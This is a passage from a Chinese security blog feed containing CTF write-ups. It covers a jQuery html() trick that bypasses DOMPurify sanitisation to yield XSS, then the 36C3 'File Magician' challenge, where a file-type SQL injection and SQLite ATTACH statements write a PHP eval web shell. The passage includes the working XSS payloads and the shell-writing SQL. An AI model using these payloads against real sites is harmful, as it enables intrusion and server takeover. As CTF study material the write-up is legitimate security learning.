&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x6709;&#x4EE5;&#x4E0B;&#x5229;&#x7528;&#x94FE;&#xFF1A;</p><p><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L372" target="_blank" rel="noopener">html()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L406" target="_blank" rel="noopener">append()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L312" target="_blank" rel="noopener">doManip()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L117" target="_blank" rel="noopener">buildFragment()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation/buildFragment.js#L39" target="_blank" rel="noopener">htmlPrefilter()</a></p><p>&#x5728; <a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202" target="_blank" rel="noopener">htmlPrefilter()</a> &#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// source of htmlPrefilter()</span></span><br><span class="line">jQuery.extend( {</span><br><span class="line">truehtmlPrefilter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"> html </span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> html.replace( rxhtmlTag, <span class="hljs-string">&quot;&lt;$1&gt;&lt;/$2&gt;&quot;</span> );</span><br><span class="line">true},</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#x7528;&#x6765;&#x8F6C;&#x6362;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x6807;&#x7B7E;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F8B;&#x5982;<code>&lt;blah/&gt;</code>&#x53D8;&#x6210;<code>&lt;blah&gt;&lt;/blah&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br></pre></td></tr></table></figure><p>&#x7ECF;&#x8FC7;<code>innerHTML</code>&#x4F1A;&#x53D8;&#x6210;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x4F46;&#x662F;&#x7ECF;&#x8FC7; jquery <code>html()</code> &#x5C31;&#x4F1A;&#x53D8;&#x6210;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line">Elon</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x901A;&#x8FC7;<code>html()</code>&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x7684;&#x62C6;&#x5206;&#xFF0C;&#x4EE5;&#x53CA;&#x628A;&#x5185;&#x5BB9;&#x8F6C;&#x6362;&#x51FA;&#x53BB;&#xFF0C;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x4E8E; mXSS &#xFF0C;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>Elon<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x7ED5;&#x8FC7; XSS WAF&#xFF0C;&#x4F8B;&#x5982;&#x4EE5;&#x4E0B;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></table></figure><p>&#x7ECF;&#x8FC7;<code>DOMPurify.sanitize</code>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert(<span class="hljs-number">1337</span>)<span class="hljs-comment">//</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x7ECF;&#x8FC7; jquery <code>html()</code>&#x5230;&#x6700;&#x7EC8;&#x6E32;&#x67D3;&#x9875;&#x9762;&#x5C31;&#x53D8;&#x6210;&#x4E86;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-handlebars"><span class="hljs-xml">alert(1337)//<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x8FD9;&#x5C31;&#x662F; JQuery&#x2019;s &#x7C7B;&#x4F3C;&#x4E8E; mXSS &#x7684; trick</p><p>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x914D;&#x5408;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x7EC8; payload &#x5982;&#x4E0B;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">notify</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></table></figure><p>&#x6700;&#x7EC8;&#x4F20;&#x53C2;:</p><figure class="highlight xquery hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=valid_img_url&amp;<span class="hljs-type">text</span>=&lt;img<span class="hljs-built_in"> name</span><span class="hljs-meta">%3dnotify</span>&gt;<span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style%2F</span>&gt;</span></span></span><span class="hljs-xml"><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()%2F%2F</span></span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x6211;&#x4E5F;&#x4E0D;&#x662F;&#x975E;&#x5E38;&#x6E05;&#x695A;&#x4F5C;&#x8005;&#x4E3A;&#x5565;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x53C2;&#x6570;//&#x5168;&#x7A0B;&#x6CA1;&#x6709;&#x7528;&#x5230;</p><p>&#x6700;&#x540E;&#x518D;&#x6765;&#x4E00;&#x904D;&#xFF1A;</p><p><img src="https://i.redd.it/rz3o1yibnc511.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/01/08/36c3-web/</id>
        <title><![CDATA[36c3 Web 学习记录]]></title>
        <updated>2020-04-11T11:55:30+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/01/08/36c3-web/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/01/08/36c3-web/"><![CDATA[<p>&#x7B7E;&#x5230;&#x9009;&#x624B;&#x4E0D;&#x8BF7;&#x81EA;&#x6765;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E86;&#x597D;&#x51E0;&#x5929;&#x7684;&#x7422;&#x78E8;&#xFF0C;&#x7EC8;&#x4E8E;&#x628A;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x9898;&#x76EE;&#x90FD;&#x5F04;&#x5F97;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x672C;&#x6B21;&#x6BD4;&#x8D5B; Web &#x9898;&#x76EE;&#x7684;&#x89E3;&#x6CD5;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/7081" target="_blank" rel="noopener">https://xz.aliyun.com/t/7081</a></p></blockquote><a id="more"></a><p>&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x66F4;&#x597D;&#x66F4;&#x6709;&#x610F;&#x601D;&#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x6B22;&#x8FCE;&#x591A;&#x591A;&#x4E0E;&#x83DC;&#x9E21;&#x4EA4;&#x6D41;&#x3002;&#x975E;&#x5E38;&#x611F;&#x8C22; @rebirth @wonderkun @wupco &#x7B49;&#x5E08;&#x5085;&#x5728;&#x6211;&#x5B66;&#x4E60;&#x672C;&#x6B21;&#x6BD4;&#x8D5B;&#x8D5B;&#x9898;&#x65F6;&#x5019;&#x4E0D;&#x538C;&#x5176;&#x70E6;&#x5730;&#x6307;&#x5BFC;&#x6211;&#x3002;</p><h2 id="File-Magician"><a href="#File-Magician" class="headerlink" title="File Magician"></a>File Magician</h2><blockquote><p><strong>Difficulty estimate</strong>: easy</p><p><strong>Solved</strong>:133/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [133 solves]))) = <strong>70</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source file hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz" target="_blank" rel="noopener">file magician-3ace41f3b0282a70.tar.xz (2.1 KiB)</a></p></blockquote><p>&#x7B97;&#x662F; Web &#x5F53;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x7B7E;&#x5230;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x7ED9;&#x51FA; Docker &#x6587;&#x4EF6;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x672C;&#x5730;&#x642D;&#x8D77;&#x6765;&#x8BD5;&#x8BD5;&#x3002;</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">&apos;display_errors&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">&apos;display_startup_errors&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>( ! <span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&apos;id&apos;</span>])) {</span><br><span class="line">    $_SESSION[<span class="hljs-string">&apos;id&apos;</span>] = bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$d = <span class="hljs-string">&apos;/var/www/html/files/&apos;</span>.$_SESSION[<span class="hljs-string">&apos;id&apos;</span>] . <span class="hljs-string">&apos;/&apos;</span>;</span><br><span class="line">@mkdir($d, <span class="hljs-number">0700</span>, <span class="hljs-keyword">TRUE</span>);</span><br><span class="line">chdir($d) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;chdir&apos;</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&apos;sqlite:&apos;</span> . $d . <span class="hljs-string">&apos;db.sqlite3&apos;</span>);</span><br><span class="line">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$db-&gt;exec(<span class="hljs-string">&apos;CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&apos;file&apos;</span>]) &amp;&amp; $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;size&apos;</span>] &lt; <span class="hljs-number">10</span>*<span class="hljs-number">1024</span> ){</span><br><span class="line">    $s = <span class="hljs-string">&quot;INSERT INTO upload(info) VALUES (&apos;&quot;</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>]). <span class="hljs-string">&quot; &apos;);&quot;</span>;</span><br><span class="line">    $db-&gt;exec($s);</span><br><span class="line">    move_uploaded_file( $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;move_upload_file&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$uploads = [];</span><br><span class="line">$sql = <span class="hljs-string">&apos;SELECT * FROM upload&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">foreach</span> ($db-&gt;query($sql) <span class="hljs-keyword">as</span> $row) {</span><br><span class="line">    $uploads[] = [$row[<span class="hljs-string">&apos;id&apos;</span>], $row[<span class="hljs-string">&apos;info&apos;</span>]];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;file magician&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($uploads <span class="hljs-keyword">as</span> $upload):<span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="hljs-string">&quot;&lt;?= &apos;/files/&apos; . $_SESSION[&apos;id&apos;] . &apos;/&apos; . $upload[0] ?&gt;&quot;</span>&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">0</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">1</span>] <span class="hljs-meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>&#x9898;&#x76EE;&#x529F;&#x80FD;&#x70B9;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x81EA;&#x5DF1;&#x7684; sandbox &#x5F53;&#x4E2D;&#x770B;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF0C;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;&#x7531;<code>(new finfo)-&gt;file</code>&#x6765;&#x5224;&#x65AD;&#x7684;&#xFF0C;&#x8FD8;&#x4F7F;&#x7528;&#x4E86; sqlite &#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x8BB0;&#x5F55;&#x3002;</p><p>&#x7531;&#x4E8E;&#x521B;&#x5EFA;&#x7684;&#x6570;&#x636E;&#x5E93;&#x89C4;&#x5B9A;&#x4E86; id &#x4E3A;&#x81EA;&#x589E;&#x957F;&#x7684;&#x6574;&#x578B;&#x4E3B;&#x952E;&#xFF0C;&#x800C;&#x4E14;&#x5B83;&#x4F7F;&#x7528;&#x4E86;<code>lastInsertId()</code>&#x8FD4;&#x56DE;&#x6700;&#x540E;&#x4E00;&#x6B21; insert &#x6570;&#x636E;&#x7684; id &#x4F5C;&#x4E3A;&#x6587;&#x4EF6;&#x540D;</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file( $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;move_upload_file&apos;</span>);</span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0A;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x8003;&#x8651;&#x662F;&#x5426;&#x5B58;&#x5728;&#x901A;&#x8FC7;&#x53EF;&#x63A7;&#x6587;&#x4EF6;&#x540D;&#x4E0A;&#x4F20;&#x6587;&#x4EF6; Getshell &#x7684;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p><p>&#x7EB5;&#x89C2;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x5236;&#x7684;&#x8F93;&#x5165;&#x70B9;&#x4E5F;&#x53EA;&#x6709;&#x5728;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x5F53;&#x4E2D;&#xFF0C;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x53C8;&#x88AB;&#x62FC;&#x5165;&#x5230;&#x4E86; sql &#x8BED;&#x53E5;&#x5F53;&#x4E2D;</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s = <span class="hljs-string">&quot;INSERT INTO upload(info) VALUES (&apos;&quot;</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>]). <span class="hljs-string">&quot; &apos;);&quot;</span>;</span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6765;&#x8FDB;&#x884C; sql &#x6CE8;&#x5165;&#x6765;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p><p>&#x6211;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F; fuzz &#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x67D0;&#x4E9B;&#x6587;&#x4EF6;&#x4F7F;&#x7528;<code>finfo</code>&#x5F97;&#x51FA;&#x6765;&#x7684;&#x7ED3;&#x679C;&#x542B;&#x6709;&#x5355;&#x5F15;&#x53F7;&#x4EC0;&#x4E48;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x8FD8;&#x80FD;&#x591F;&#x63D2;&#x5165;&#x53EF;&#x63A7;&#x6570;&#x636E;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x5C31;&#x5F00;&#x59CB; fuzz &#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x4ECE;<code>0x00</code>&#x5230;<code>0xff0xff</code>&#x3002;</p><p>&#x7EC8;&#x4E8E;&#x5728;<code>0x1f0x9d</code>&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;<code>compress&apos;d data</code>&#xFF0C;&#x867D;&#x7136;&#x6709;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#x3002;</p><p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x662F;<code>0xfb0x01</code>&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;<code>QDOS object &apos;&apos;</code>&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x5F88;&#x5BF9;&#x7684;&#x6837;&#x5B50;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x53EF;&#x4EE5;&#x5728;&#x5355;&#x5F15;&#x53F7;&#x4E4B;&#x95F4;&#x63D2;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x968F;&#x4FBF;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png" alt></p><p>&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x88AB;&#x5403;&#x6389;&#x4E86;&#x4E00;&#x4E2A;<code>p</code>&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x8C03;&#x6574;&#x4E00;&#x4E0B; payload &#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#x4E86;&#x3002;</p><p>sqlite &#x662F;&#x53EF;&#x4EE5;&#x7528; .php &#x6587;&#x4EF6;&#x540D;&#x6765;&#x4F5C;&#x4E3A;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x53EF;&#x5199;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; sqlite attach &#x4E00;&#x4E2A; z.php &#x7684;&#x65B9;&#x6CD5;&#x6765;&#x5199; shell &#x4E86;&#x3002;</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;create TABLE t.e (d text);/*</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;insert INTO t.e (d) VALUES (&apos;&lt;?php eval($_POST[a])?&gt;&apos;);/*</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x5C31;&#x662F;&#x6709;&#x957F;&#x5EA6;&#x9650;&#x5236;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5206;&#x4E24;&#x6B21;&#x6765;&#x5199; shell</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png" alt></p><h3 id="other-file"><a href="#other-file" class="headerlink" title="other file"></a>other file</h3><p>&#x770B;&#x5176;&#x4ED6;&#x9009;&#x624B;&#x7684;&#x516C;&#x5F00;&#x7684; wp &#x4E5F;&#x662F;&#x5F88;&#x6709;&#x8DA3;&#x7684;&#x4E00;&#x4EF6;&#x4E8B;&#xFF0C;&#x7136;&#x540E;&#x4ECE; ctftime &#x4E0A;&#x516C;&#x5F00;&#x7684; 